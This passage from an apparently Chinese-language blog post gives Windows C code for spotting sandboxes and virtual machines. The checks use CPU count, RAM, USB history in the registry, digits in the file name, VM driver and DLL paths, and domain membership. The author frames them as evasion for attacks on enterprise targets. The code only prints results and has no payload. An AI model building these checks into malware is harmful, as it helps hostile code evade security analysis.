(CheckSpecificProcesses(t[i])) &#123;</span><br><span class="line">            <span class="comment">// 可以在这里添加找到了进程后的处理逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查CPU"><a href="#检查CPU" class="headerlink" title="检查CPU"></a>检查CPU</h4><p>可以使用<code>GetSystemInfo</code>进行CPU 检查。此函数返回⼀个<code>SYSTEM_INFO</code>结构，其中包含有关系统的信息，包括处理器数量.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckCPU</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化 SYSTEM_INFO 结构体，用于存储系统信息</span></span><br><span class="line">    SYSTEM_INFO SysInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 调用 Windows API 获取系统信息并存储在 SysInfo 中</span></span><br><span class="line">    GetSystemInfo(&amp;SysInfo);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印处理器核心数量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of processors: %u\n&quot;</span>, SysInfo.dwNumberOfProcessors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查处理器核心数量是否小于 2</span></span><br><span class="line">    <span class="keyword">if</span> (SysInfo.dwNumberOfProcessors &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Warning: System is using less than 2 processors.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE; <span class="comment">// 可能是虚拟化环境，返回 TRUE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 处理器核心数量正常，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统的处理器核心数量</span></span><br><span class="line">    <span class="keyword">if</span> (CheckCPU()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is potentially running in a virtualized environment.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is likely running on physical hardware.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查RAM"><a href="#检查RAM" class="headerlink" title="检查RAM"></a>检查RAM</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckRAM</span><span class="params">()</span> &#123;</span><br><span class="line">    MEMORYSTATUSEX MemStatus;</span><br><span class="line">    MemStatus.dwLength = <span class="keyword">sizeof</span>(MEMORYSTATUSEX);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 Windows API 函数 GlobalMemoryStatusEx 获取系统内存使用情况</span></span><br><span class="line">    <span class="keyword">if</span> (!GlobalMemoryStatusEx(&amp;MemStatus)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] GlobalMemoryStatusEx Failed With Error: %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 获取内存信息失败，返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印总物理内存的大小</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Total Physical Memory: %llu bytes\n&quot;</span>, MemStatus.ullTotalPhys);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查总物理内存是否小于或等于 2GB</span></span><br><span class="line">    <span class="keyword">if</span> (MemStatus.ullTotalPhys &lt;= (<span class="number">2ULL</span> * <span class="number">1073741824ULL</span>)) &#123; <span class="comment">// 2 * 1024^3 = 2GB</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Warning: System has 2GB or less of RAM.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> TRUE; <span class="comment">// 可能是虚拟化环境，返回 TRUE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 内存大小正常，返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统的内存大小</span></span><br><span class="line">    <span class="keyword">if</span> (CheckRAM()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is potentially running in a virtualized environment.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system likely has sufficient physical RAM.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查USB"><a href="#检查USB" class="headerlink" title="检查USB"></a>检查USB</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">CheckUSB</span><span class="params">()</span> &#123;</span><br><span class="line">    HKEY hKey = <span class="literal">NULL</span>;          <span class="comment">// 用于存储打开的注册表项句柄</span></span><br><span class="line">    DWORD dwUsbNumber = <span class="number">0</span>;     <span class="comment">// 用于存储 USB 设备数量</span></span><br><span class="line">    DWORD dwRegErr = <span class="number">0</span>;        <span class="comment">// 用于存储注册表操作的错误代码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开注册表项以获取 USB 存储设备的枚举信息</span></span><br><span class="line">    dwRegErr = RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SYSTEM\\ControlSet001\\Enum\\USBSTOR&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRegErr != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] RegOpenKeyExA Failed With Error: %d | 0x%0.8X \n&quot;</span>, dwRegErr, dwRegErr);</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 打开注册表项失败时返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询注册表项的子项数量，即 USB 存储设备的数量</span></span><br><span class="line">    dwRegErr = RegQueryInfoKeyA(hKey, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;dwUsbNumber, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (dwRegErr != ERROR_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] RegQueryInfoKeyA Failed With Error: %d | 0x%0.8X \n&quot;</span>, dwRegErr, dwRegErr);</span><br><span class="line">        RegCloseKey(hKey); <span class="comment">// 确保在失败时关闭注册表项句柄</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;      <span class="comment">// 查询失败时返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印检测到的 USB 数量</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Number of USB devices previously mounted: %u\n&quot;</span>, dwUsbNumber);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果之前挂载的 USB 设备少于 2 个，则可能是虚拟化环境</span></span><br><span class="line">    <span class="keyword">if</span> (dwUsbNumber &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Warning: Less than 2 USB devices previously mounted.\n&quot;</span>);</span><br><span class="line">        RegCloseKey(hKey); <span class="comment">// 关闭注册表项句柄</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;       <span class="comment">// 返回 TRUE 表示可能是虚拟化环境</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RegCloseKey(hKey); <span class="comment">// 关闭注册表项句柄</span></span><br><span class="line">    <span class="keyword">return</span> FALSE;      <span class="comment">// 返回 FALSE 表示正常环境</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查系统的 USB 设备数量</span></span><br><span class="line">    <span class="keyword">if</span> (CheckUSB()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system is potentially running in a virtualized environment.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The system has a normal number of USB devices.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查文件名"><a href="#检查文件名" class="headerlink" title="检查文件名"></a>检查文件名</h4><p>沙箱通常会将文件重命名为⼀种分类方法(例如，将其重命名为其 MD5 哈希)。此过程通常会导致一个包含字母和数字混合的任意文件名.</p><p>如果文件名中包含的数字超过 3 个，则<code>ExeDigitsInNameCheck</code>将假定它位于沙箱中并返回 TRUE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;shlwapi.h&gt;</span> <span class="comment">// 包含 PathFindFileNameA 函数的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span>   <span class="comment">// 包含 isdigit 函数的头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Shlwapi.lib&quot;</span>) <span class="comment">// 链接 Shlwapi 库</span></span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">ExeDigitsInNameCheck</span><span class="params">()</span> &#123;</span><br><span class="line">    CHAR Path[MAX_PATH * <span class="number">3</span>];  <span class="comment">// 用于存储完整路径的缓冲区</span></span><br><span class="line">    CHAR cName[MAX_PATH];     <span class="comment">// 用于存储文件名的缓冲区</span></span><br><span class="line">    DWORD dwNumberOfDigits = <span class="number">0</span>; <span class="comment">// 用于计数文件名中的数字个数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前模块（可执行文件）的完整路径</span></span><br><span class="line">    <span class="keyword">if</span> (!GetModuleFileNameA(<span class="literal">NULL</span>, Path, MAX_PATH * <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\t[!] GetModuleFileNameA Failed With Error : %d \n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 获取失败，返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取文件名（从完整路径中提取）</span></span><br><span class="line">    LPCSTR fileName = PathFindFileNameA(Path);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件名为:%s\n&quot;</span>, fileName);</span><br><span class="line">    <span class="comment">// 防止缓冲区溢出，确保文件名长度在 MAX_PATH 之内</span></span><br><span class="line">    <span class="keyword">if</span> (lstrlenA(fileName) &lt; MAX_PATH) &#123;</span><br><span class="line">        lstrcpyA(cName, fileName); <span class="comment">// 将文件名复制到 cName 缓冲区中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE; <span class="comment">// 文件名过长，返回 FALSE</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历文件名中的每个字符，统计数字的个数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; lstrlenA(cName); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isdigit</span>(cName[i])) &#123;</span><br><span class="line">            dwNumberOfDigits++; <span class="comment">// 如果是数字，计数器加一</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果文件名中的数字个数超过 3，则返回 TRUE</span></span><br><span class="line">    <span class="keyword">if</span> (dwNumberOfDigits &gt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE; <span class="comment">// 否则返回 FALSE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 检查当前可执行文件名中的数字个数</span></span><br><span class="line">    <span class="keyword">if</span> (ExeDigitsInNameCheck()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Filename contains more than 3 digits.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Filename contains 3 or fewer digits.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查DLLS"><a href="#检查DLLS" class="headerlink" title="检查DLLS"></a>检查DLLS</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测是否存在指定的沙箱相关的 DLL</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">checkSandboxDlls</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 定义已知的与沙箱相关的 DLL 名称列表</span></span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* dllNames[] = &#123;</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxdisp.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxhook.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxservice.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\vboxtray.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\windows\\System32\\VBoxControl.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe&quot;</span>,</span><br><span class="line">        <span class="string">L&quot;C:\\Program Files\\Common Files\\VMware\\Drivers\\mouse\\Win8\\vmmousever.dll&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> numElements = <span class="keyword">sizeof</span>(dllNames) / <span class="keyword">sizeof</span>(dllNames[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numElements; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_waccess(dllNames[i], <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            wprintf(<span class="string">L&quot;Detected sandbox-related DLL: %s\n&quot;</span>, dllNames[i]);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkSandboxDlls()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No sandbox environment detected.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查域环境"><a href="#检查域环境" class="headerlink" title="检查域环境"></a>检查域环境</h4><p>由于我们通常针对企业环境，因此可以假设用户的计算机是域的成员。让我们检查机器的域加入状态：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Netapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">checkDomain</span><span class="params">()</span> &#123;</span><br><span class="line">    PWSTR domainName = <span class="literal">NULL</span>;</span><br><span class="line">    NETSETUP_JOIN_STATUS status;</span><br><span class="line">    NET_API_STATUS nStatus;</span><br><span class="line"></span><br><span class="line">    nStatus = NetGetJoinInformation(<span class="literal">NULL</span>, &amp;domainName, &amp;status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nStatus != NERR_Success) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to get join information. Error: %lu\n&quot;</span>, nStatus);</span><br><span class="line">        <span class="keyword">return</span> FALSE;  <span class="comment">// 返回FALSE，表示无法确定域状态</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BOOL notInDomain = (status != NetSetupDomainName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notInDomain) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The computer is not joined to a domain.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;The computer is joined to the domain: %s\n&quot;</span>, domainName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (domainName != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        NetApiBufferFree(domainName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> notInDomain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkDomain()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The computer is not in a domain.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The computer is in a domain.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="检查屏幕分辨率"><a href="#检查屏幕分辨率" class="headerlink" title="检查屏幕分辨率"></a>检查屏幕分辨率</h4><p>虚拟化环境很少使用多个监视器（尤其是沙箱）。虚拟显示器也可能具有非典型的屏幕尺寸（特别是当安装到主机屏幕但不是全屏模式时-请注意带有栏和选项卡的管理程序窗口）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 